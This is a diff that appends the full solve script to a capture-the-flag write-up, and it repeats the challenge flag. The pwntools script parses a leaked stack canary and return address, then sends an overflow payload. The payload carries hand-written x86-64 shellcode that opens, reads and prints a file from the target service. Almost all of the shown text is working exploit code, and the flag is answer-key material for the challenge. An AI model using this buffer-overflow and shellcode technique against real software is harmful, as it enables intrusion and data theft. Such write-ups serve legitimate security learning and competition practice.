@@ -494,3 +494,78 @@ cuhk25ctf{Secr3t_C0mpu71ng_1n_S3cure_C0mpartm3n7}
 ```
 
 We've got the flag: `cuhk25ctf{Secr3t_C0mpu71ng_1n_S3cure_C0mpartm3n7}`!
+
+## Full Exploit Code
+
+```py [solve.py]
+from pwn import *
+
+def start(argv=[], *a, **kw):
+  return process([exe] + argv, *a, **kw)
+
+exe = './service'
+elf = context.binary = ELF(exe, checksec=False)
+
+context.log_level = 'debug'
+
+custom_assembly = """
+.global _start
+
+_start:
+.intel_syntax noprefix
+
+mov rbx, 0x000000007478742e
+push rbx
+
+mov rbx, 0x746e656d74726170
+push rbx
+
+mov rbx, 0x6d6f632f7070612f
+push rbx
+
+mov rsi, rsp
+
+mov rdi, 0xFFFFFF9C
+mov rdx, 0
+mov r10, 0
+mov rax, 257
+syscall
+
+mov rdi, rax
+mov rsi, rsp
+mov rdx, 100
+mov rax, 0
+syscall
+
+mov rdx, rax
+mov rdi, 1
+mov rsi, rsp
+mov rax, 1
+syscall
+
+mov rdi, 0
+mov rax, 60
+syscall
+"""
+
+shellcode = asm(custom_assembly)
+io = start()
+
+bruh1 = io.recvuntil("renting at ")
+input1 = io.recvuntil(", but")
+
+bruh3 = io.recvuntil("HKD")
+input2 = io.recvuntil(" for ")
+
+# Some processing is required for the input since it is given as a string.
+run_address_hex = input1[2:14]
+canary_hex_digits = input2[3:19]
+
+canary = unhex(canary_hex_digits)[::-1]
+
+run_address = unhex(run_address_hex)[::-1]
+payload = shellcode + b'a'*(0x88-len(shellcode)) + canary + b'b'*(0x10-8)+run_address
+
+io.sendlineafter("storage!", payload)
+io.interactive()
+```
